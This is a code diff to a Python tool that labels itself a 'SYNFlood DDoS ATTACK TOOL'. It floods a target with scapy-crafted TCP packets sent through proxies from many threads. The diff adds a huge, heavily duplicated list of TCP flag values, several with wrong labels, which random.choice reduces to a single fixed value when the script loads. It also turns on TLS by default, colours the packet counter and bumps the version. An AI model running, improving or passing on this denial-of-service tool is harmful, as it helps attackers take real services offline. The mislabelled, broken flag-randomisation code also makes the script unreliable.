@@ -15,7 +15,206 @@ from concurrent.futures import ThreadPoolExecutor
 import requests
 from scapy.all import IP, TCP
 
-
+flags_List = random.choice([
+    0x02,  # SYN
+    0x12,  # SYN + ACK
+    0x04,  # RST
+    0x18,  # PSH + SYN
+    0x06,  # SYN + ACK
+    0x10,  # ACK
+    0x01,  # FIN
+    0x14,  # PSH + ACK
+    0x08,  # PSH
+    0x0C,  # PSH + RST
+    0x1A,  # PSH + SYN + ACK
+    0x0A,  # FIN + PSH
+    0x0E,  # FIN + RST
+    0x1C,  # PSH + RST + SYN
+    0x0D,  # FIN + ACK
+    0x1E,  # PSH + FIN + SYN
+    0x1F,  # PSH + FIN + RST + SYN
+    0x03,  # SYN + FIN
+    0x05,  # RST + SYN
+    0x07,  # RST + SYN + ACK
+    0x09,  # FIN + SYN
+    0x11,  # ACK + SYN
+    0x13,  # ACK + PSH
+    0x15,  # ACK + RST
+    0x17,  # ACK + FIN
+    0x19,  # ACK + PSH + SYN
+    0x1B,  # ACK + PSH + RST
+    0x1D,  # ACK + FIN + RST
+    0x1C,  # PSH + RST + ACK
+    0x1A,  # PSH + SYN + FIN
+    0x1E,  # PSH + FIN + RST
+    0x1F,  # PSH + FIN + RST + SYN
+    0x02,  # SYN
+    0x12,  # SYN + ACK
+    0x04,  # RST
+    0x18,  # PSH + SYN
+    0x06,  # SYN + ACK
+    0x10,  # ACK
+    0x01,  # FIN
+    0x14,  # PSH + ACK
+    0x08,  # PSH
+    0x0C,  # PSH + RST
+    0x1A,  # PSH + SYN + ACK
+    0x0A,  # FIN + PSH
+    0x0E,  # FIN + RST
+    0x1C,  # PSH + RST + SYN
+    0x0D,  # FIN + ACK
+    0x1E,  # PSH + FIN + SYN
+    0x1F,  # PSH + FIN + RST + SYN
+    0x03,  # SYN + FIN
+    0x05,  # RST + SYN
+    0x07,  # RST + SYN + ACK
+    0x09,  # FIN + SYN
+    0x11,  # ACK + SYN
+    0x13,  # ACK + PSH
+    0x15,  # ACK + RST
+    0x17,  # ACK + FIN
+    0x19,  # ACK + PSH + SYN
+    0x1B,  # ACK + PSH + RST
+    0x1D,  # ACK + FIN + RST
+    0x1C,  # PSH + RST + ACK
+    0x1A,  # PSH + SYN + FIN
+    0x1E,  # PSH + FIN + RST
+    0x1F,  # PSH + FIN + RST + SYN
+    0x02,  # SYN
+    0x12,  # SYN + ACK
+    0x04,  # RST
+    0x18,  # PSH + SYN
+    0x06,  # SYN + ACK
+    0x10,  # ACK
+    0x01,  # FIN
+    0x14,  # PSH + ACK
+    0x08,  # PSH
+    0x0C,  # PSH + RST
+    0x1A,  # PSH + SYN + ACK
+    0x0A,  # FIN + PSH
+    0x0E,  # FIN + RST
+    0x1C,  # PSH + RST + SYN
+    0x0D,  # FIN + ACK
+    0x1E,  # PSH + FIN + SYN
+    0x1F,  # PSH + FIN + RST + SYN
+    0x03,  # SYN + FIN
+    0x05,  # RST + SYN
+    0x07,  # RST + SYN + ACK
+    0x09,  # FIN + SYN
+    0x11,  # ACK + SYN
+    0x13,  # ACK + PSH
+    0x15,  # ACK + RST
+    0x17,  # ACK + FIN
+    0x19,  # ACK + PSH + SYN
+    0x1B,  # ACK + PSH + RST
+    0x1D,  # ACK + FIN + RST
+    0x1C,  # PSH + RST + ACK
+    0x1A,  # PSH + SYN + FIN
+    0x1E,  # PSH + FIN + RST
+    0x1F,  # PSH + FIN + RST + SYN
+    0x02,  # SYN
+    0x12,  # SYN + ACK
+    0x04,  # RST
+    0x18,  # PSH + SYN
+    0x06,  # SYN + ACK
+    0x10,  # ACK
+    0x01,  # FIN
+    0x14,  # PSH + ACK
+    0x08,  # PSH
+    0x0C,  # PSH + RST
+    0x1A,  # PSH + SYN + ACK
+    0x0A,  # FIN + PSH
+    0x0E,  # FIN + RST
+    0x1C,  # PSH + RST + SYN
+    0x0D,  # FIN + ACK
+    0x1E,  # PSH + FIN + SYN
+    0x1F,  # PSH + FIN + RST + SYN
+    0x03,  # SYN + FIN
+    0x05,  # RST + SYN
+    0x07,  # RST + SYN + ACK
+    0x09,  # FIN + SYN
+    0x11,  # ACK + SYN
+    0x13,  # ACK + PSH
+    0x15,  # ACK + RST
+    0x17,  # ACK + FIN
+    0x19,  # ACK + PSH + SYN
+    0x1B,  # ACK + PSH + RST
+    0x1D,  # ACK + FIN + RST
+    0x1C,  # PSH + RST + ACK
+    0x1A,  # PSH + SYN + FIN
+    0x1E,  # PSH + FIN + RST
+    0x1F,   # PSH + FIN + RST + SYN
+    0x12,  # SYN + ACK
+    0x04,  # RST
+    0x18,  # PSH + SYN
+    0x06,  # SYN + ACK
+    0x10,  # ACK
+    0x01,  # FIN
+    0x14,  # PSH + ACK
+    0x08,  # PSH
+    0x0C,  # PSH + RST
+    0x1A,  # PSH + SYN + ACK
+    0x0A,  # FIN + PSH
+    0x0E,  # FIN + RST
+    0x1C,  # PSH + RST + SYN
+    0x0D,  # FIN + ACK
+    0x1E,  # PSH + FIN + SYN
+    0x1F,  # PSH + FIN + RST + SYN
+    0x03,  # SYN + FIN
+    0x05,  # RST + SYN
+    0x07,  # RST + SYN + ACK
+    0x09,  # FIN + SYN
+    0x11,  # ACK + SYN
+    0x13,  # ACK + PSH
+    0x15,  # ACK + RST
+    0x17,  # ACK + FIN
+    0x19,  # ACK + PSH + SYN
+    0x1B,  # ACK + PSH + RST
+    0x1D,  # ACK + FIN + RST
+    0x1C,  # PSH + RST + ACK
+    0x1A,  # PSH + SYN + FIN
+    0x1E,  # PSH + FIN + RST
+    0x1F,  # PSH + FIN + RST + SYN
+    0x02,  # SYN
+    0x12,  # SYN + ACK
+    0x04,  # RST
+    0x18,  # PSH + SYN
+    0x06,  # SYN + ACK
+    0x10,  # ACK
+    0x01,  # FIN
+    0x14,  # PSH + ACK
+    0x08,  # PSH
+    0x0C,  # PSH + RST
+    0x1A,  # PSH + SYN + ACK
+    0x0A,  # FIN + PSH
+    0x0E,  # FIN + RST
+    0x1C,  # PSH + RST + SYN
+    0x0D,  # FIN + ACK
+    0x1E,  # PSH + FIN + SYN
+    0x1F,  # PSH + FIN + RST + SYN
+    0x03,  # SYN + FIN
+    0x05,  # RST + SYN
+    0x07,  # RST + SYN + ACK
+    0x09,  # FIN + SYN
+    0x11,  # ACK + SYN
+    0x13,  # ACK + PSH
+    0x15,  # ACK + RST
+    0x17,  # ACK + FIN
+    0x19,  # ACK + PSH + SYN
+    0x1B,  # ACK + PSH + RST
+    0x1D,  # ACK + FIN + RST
+    0x1C,  # PSH + RST + ACK
+    0x1A,  # PSH + SYN + FIN
+    0x1E,  # PSH + FIN + RST
+    0x1F,  # PSH + FIN + RST + SYN
+    0x02,  # SYN
+    0x12,  # SYN + ACK
+    0x04,  # RST
+    0x18,  # PSH + SYN
+    0x06,  # SYN + ACK
+    0x10,  # ACK
+    0x01,  # FIN
+])
 # ---------------------- Logging Setup ----------------------
 logging.basicConfig(
     filename='syn_flood.log',
@@ -88,7 +287,7 @@ class RateLimiter:
 
 
 class SYNFlood:
-    def __init__(self, target_ip, target_port, rate_limit, proxies=None, use_tls=False):
+    def __init__(self, target_ip, target_port, rate_limit, proxies=None, use_tls=True):
         self.target = (target_ip, target_port)
         self.syn_packet_count = 0
         self.rate_limiter = RateLimiter(rate_limit)
@@ -108,7 +307,7 @@ class SYNFlood:
         tcp_layer = TCP(
             sport=random.randint(32768, 65535),
             dport=self.target[1],
-            flags="S",
+            flags=flags_List,
             seq=random.randint(0, 4294967295),
             window=random.randint(1000, 65535),  # Randomize TCP window size
         )
@@ -196,7 +395,7 @@ def display_statistics(syn_flooder: SYNFlood):
         current_count = syn_flooder.get_packet_count()
         rps = current_count - prev_count
         prev_count = current_count
-        print(f"Total SYN Packets Sent: {current_count} (RPS: {rps})")
+        print(f"\033[1;32mTotal SYN Packets Sent: {current_count} (RPS: {rps})\033[0m")
 
 
 
@@ -236,8 +435,6 @@ def main(target_url, target_port=80, thread_count=100, packets_per_thread=100, r
     
     print(f"[INFO] Valid proxies found: {len(valid_proxies)}")
     # Proceed with the SYN flood attack using valid proxies
-    
-    
 
     # Resolve URL to IP addresses
     target_ips = resolve_url_to_ips(target_url)
@@ -303,7 +500,7 @@ def Banner():
 ██████╔╝   ╚██╔╝  ██║ ╚████║██║     ██████╗╚██████╔╝╚██████╔╝║██████╔╝
 ╚═════╝    ╚═══╝  ╚═╝  ╚═══╝╚═╝     ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝
     SYNFlood DDoS ATTACK TOOL
-    Version 1.0
+    Version 1.5
     """
     print(f"{color}{banner}{reset_color}")
 
